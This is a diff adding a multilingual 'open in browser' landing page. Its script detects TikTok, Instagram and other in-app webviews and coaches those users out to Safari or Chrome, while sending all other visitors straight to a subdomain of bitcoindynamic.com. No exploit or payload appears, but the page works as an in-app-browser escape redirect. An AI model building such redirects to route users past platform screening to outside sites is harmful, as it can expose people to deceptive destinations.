@@ -1,0 +1,62 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#ffffff">
+<title>Abrir en navegador</title>
+<link rel="preload" as="image" href="https://movilios.com/abrir-en-navegador.gif?v=4" type="image/gif">
+<script>
+(function(){
+ const destination='https://solonegoxiaqui.bitcoindynamic.com/';
+ const ua=navigator.userAgent||'';
+ const inApp=/TikTok|musical_ly|BytedanceWebview|ByteDance|aweme|trill|TTWebView|FBAN|FBAV|Instagram|Messenger|Snapchat|Twitter|Pinterest|Telegram|WhatsApp|Line\//i.test(ua)||/;\s*wv\)/i.test(ua)||/\bwv\b/i.test(ua)||(/iPhone|iPad|iPod/i.test(ua)&&/AppleWebKit/i.test(ua)&&!/Safari/i.test(ua));
+ document.documentElement.classList.add(inApp?'in-app':'external');
+ if(!inApp) location.replace(destination);
+})();
+</script>
+<style>
+:root{--ink:#171921;--muted:#6d7280;--line:#e6e8ed;--soft:#f4f6f9;--blue:#087df5;--green:#20bf67}
+*{box-sizing:border-box}html,body{margin:0;min-height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+body{background:#eef1f5;color:var(--ink);-webkit-font-smoothing:antialiased}html.external main{display:none}
+.shell{width:min(100%,430px);min-height:100vh;min-height:100dvh;margin:auto;padding:env(safe-area-inset-top) 17px calc(20px + env(safe-area-inset-bottom));background:linear-gradient(180deg,#fff 0%,#fafbfc 100%);box-shadow:0 0 45px rgba(24,32,48,.1)}
+.topbar{height:57px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--line)}
+.secure{display:flex;align-items:center;gap:7px;font-size:12.5px;font-weight:750}.secure svg{width:18px;height:18px;fill:var(--green)}
+.detected{display:flex;align-items:center;gap:6px;padding:7px 10px;border:1px solid var(--line);border-radius:999px;background:var(--soft);color:#585d68;font-size:10px;font-weight:850;text-transform:uppercase}.detected:before{content:"";width:7px;height:7px;border-radius:50%;background:var(--green)}
+.hero{text-align:center;padding:20px 6px 14px}.browser-logo{display:block;width:42px;height:42px;margin:0 auto 11px;filter:drop-shadow(0 6px 10px rgba(27,34,48,.16))}
+h1{margin:0;font-size:24px;line-height:1.15;font-weight:850;letter-spacing:-.55px}.subtitle{margin:8px auto 0;color:var(--muted);font-size:13px;line-height:1.4}
+.demo{position:relative;width:100%;aspect-ratio:1/1;border:1px solid #d9dde5;border-radius:21px;overflow:hidden;background:#fff;box-shadow:0 13px 32px rgba(24,32,48,.13)}.demo img{display:block;width:100%;height:100%;object-fit:contain;object-position:center}
+.live{position:absolute;left:11px;top:11px;display:flex;align-items:center;gap:6px;padding:7px 10px;border-radius:999px;background:rgba(18,20,25,.78);color:#fff;font-size:9.5px;font-weight:850;backdrop-filter:blur(8px)}.live:before{content:"";width:7px;height:7px;border-radius:50%;background:#31db7d;box-shadow:0 0 0 3px rgba(49,219,125,.18)}
+.gif-fallback{display:none;width:100%;height:100%;place-items:center;text-align:center;background:linear-gradient(145deg,#f8faff,#edf3fb)}.gif-fallback.show{display:grid}.fallback-arrow{font-size:45px;line-height:1;color:var(--blue);animation:nudge 1s ease-in-out infinite}.fallback-menu{font-size:41px;font-weight:900;letter-spacing:4px}.gif-fallback strong{display:block;margin-top:7px;font-size:13px}
+.corner-cue{position:fixed;z-index:20;right:max(13px,env(safe-area-inset-right));top:max(7px,env(safe-area-inset-top));display:flex;align-items:center;gap:5px;pointer-events:none;filter:drop-shadow(0 3px 8px rgba(20,25,35,.24));animation:nudge 1s ease-in-out infinite}.corner-cue span{padding:7px 9px;border-radius:999px;background:#161921;color:#fff;font-size:9px;font-weight:900;white-space:nowrap}.corner-cue svg{width:32px;height:32px;fill:none;stroke:#161921;stroke-width:2.8;stroke-linecap:round;stroke-linejoin:round;transform:rotate(-16deg)}
+@keyframes nudge{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
+.steps{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-top:13px}.step{min-height:71px;display:flex;align-items:center;gap:9px;padding:11px;border:1px solid var(--line);border-radius:15px;background:#fff;box-shadow:0 4px 13px rgba(24,32,48,.04)}.number{flex:0 0 29px;width:29px;height:29px;border-radius:50%;display:grid;place-items:center;background:var(--blue);color:#fff;font-size:12px;font-weight:850}.step strong{display:block;font-size:12px;line-height:1.22}.step span{display:block;margin-top:3px;color:var(--muted);font-size:10px;line-height:1.2}
+.waiting{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:14px;padding:12px;border:1px solid #d8eaff;border-radius:14px;background:#eff7ff;color:#0872df;font-size:11.5px;font-weight:750}.spinner{width:15px;height:15px;border:2px solid #b9d9ff;border-top-color:var(--blue);border-radius:50%;animation:spin .85s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}
+@media(max-width:350px){.shell{padding-left:12px;padding-right:12px}.steps{grid-template-columns:1fr}.hero{padding-top:16px}.demo{border-radius:17px}}@media(prefers-reduced-motion:reduce){.spinner,.corner-cue,.fallback-arrow{animation:none}}
+</style>
+</head>
+<body>
+<main class="shell">
+<div class="corner-cue" aria-hidden="true"><span data-i18n="tapHere">PULSA AQUÍ</span><svg viewBox="0 0 40 40"><path d="M5 31C16 29 25 21 31 8M22 10l9-2 2 9"/></svg></div>
+<header class="topbar"><div class="secure"><svg viewBox="0 0 24 24"><path d="M12 2 4 5v6c0 5.2 3.4 9.8 8 11 4.6-1.2 8-5.8 8-11V5l-8-3Zm-1.1 14.3-3.2-3.2 1.4-1.4 1.8 1.8 4.2-4.2 1.4 1.4-5.6 5.6Z"/></svg><span data-i18n="secure">Guía de navegación</span></div><div class="detected"><span id="languageName">Español</span></div></header>
+<section class="hero"><svg class="browser-logo" viewBox="0 0 48 48" role="img" aria-label="Navegador"><circle cx="24" cy="24" r="22" fill="#087df5"/><g fill="none" stroke="#fff" stroke-width="2"><circle cx="24" cy="24" r="15"/><ellipse cx="24" cy="24" rx="7" ry="15"/><path d="M9 24h30M12 15h24M12 33h24"/></g></svg><h1 data-i18n="title">Pulsa ••• y abre en navegador</h1><p class="subtitle" id="subtitle">Selecciona «Abrir en Safari».</p></section>
+<section class="demo"><img id="guideGif" src="https://movilios.com/abrir-en-navegador.gif?v=4" alt="Tutorial para abrir en navegador"><div class="gif-fallback" id="gifFallback"><div><div class="fallback-arrow">↗</div><div class="fallback-menu">•••</div><strong data-i18n="tapDots">Pulsa los tres puntos</strong></div></div><div class="live"><span data-i18n="guide">GUÍA ANIMADA</span></div></section>
+<section class="steps"><div class="step"><div class="number">1</div><div><strong data-i18n="step1">Pulsa •••</strong><span data-i18n="topCorner">Esquina superior</span></div></div><div class="step"><div class="number">2</div><div><strong id="step2Title">Abrir en Safari</strong><span id="step2Sub">Usa Safari</span></div></div></section>
+<div class="waiting"><div class="spinner"></div><span data-i18n="waiting">Esperando el navegador…</span></div>
+</main>
+<script>
+(function(){
+const dictionaries={
+ es:{name:'Español',secure:'Guía de navegación',tapHere:'PULSA AQUÍ',title:'Pulsa ••• y abre en navegador',browser:'Selecciona «Abrir en navegador».',safari:'Selecciona «Abrir en Safari».',guide:'GUÍA ANIMADA',tapDots:'Pulsa los tres puntos',step1:'Pulsa •••',topCorner:'Esquina superior',openBrowser:'Abrir en navegador',openSafari:'Abrir en Safari',useChrome:'Usa Chrome',useSafari:'Usa Safari',waiting:'Esperando el navegador…'},
+ en:{name:'English',secure:'Browser guide',tapHere:'TAP HERE',title:'Tap ••• and open in browser',browser:'Select “Open in browser”.',safari:'Select “Open in Safari”.',guide:'ANIMATED GUIDE',tapDots:'Tap the three dots',step1:'Tap •••',topCorner:'Top corner',openBrowser:'Open in browser',openSafari:'Open in Safari',useChrome:'Use Chrome',useSafari:'Use Safari',waiting:'Waiting for browser…'},
+ pt:{name:'Português',secure:'Guia de navegação',tapHere:'TOQUE AQUI',title:'Toque em ••• e abra no navegador',browser:'Selecione “Abrir no navegador”.',safari:'Selecione “Abrir no Safari”.',guide:'GUIA ANIMADO',tapDots:'Toque nos três pontos',step1:'Toque em •••',topCorner:'Canto superior',openBrowser:'Abrir no navegador',openSafari:'Abrir no Safari',useChrome:'Use o Chrome',useSafari:'Use o Safari',waiting:'Aguardando o navegador…'},
+ fr:{name:'Français',secure:'Guide du navigateur',tapHere:'APPUYEZ ICI',title:'Appuyez sur ••• et ouvrez dans le navigateur',browser:'Sélectionnez « Ouvrir dans le navigateur ».',safari:'Sélectionnez « Ouvrir dans Safari ».',guide:'GUIDE ANIMÉ',tapDots:'Appuyez sur les trois points',step1:'Appuyez sur •••',topCorner:'Coin supérieur',openBrowser:'Ouvrir dans le navigateur',openSafari:'Ouvrir dans Safari',useChrome:'Utilisez Chrome',useSafari:'Utilisez Safari',waiting:'En attente du navigateur…'}
+};
+const prefs=navigator.languages||[navigator.language||'es'];let lang='en';for(const pref of prefs){const key=pref.toLowerCase().split('-')[0];if(dictionaries[key]){lang=key;break;}}
+const t=dictionaries[lang];document.documentElement.lang=lang;const ios=/iPhone|iPad|iPod/i.test(navigator.userAgent||'');
+document.querySelectorAll('[data-i18n]').forEach(el=>{if(t[el.dataset.i18n])el.textContent=t[el.dataset.i18n]});document.getElementById('languageName').textContent=t.name;document.getElementById('subtitle').textContent=ios?t.safari:t.browser;document.getElementById('step2Title').textContent=ios?t.openSafari:t.openBrowser;document.getElementById('step2Sub').textContent=ios?t.useSafari:t.useChrome;
+const img=document.getElementById('guideGif');img.addEventListener('error',()=>{img.style.display='none';document.getElementById('gifFallback').classList.add('show')});
+})();
+</script>
+</body>
+</html>
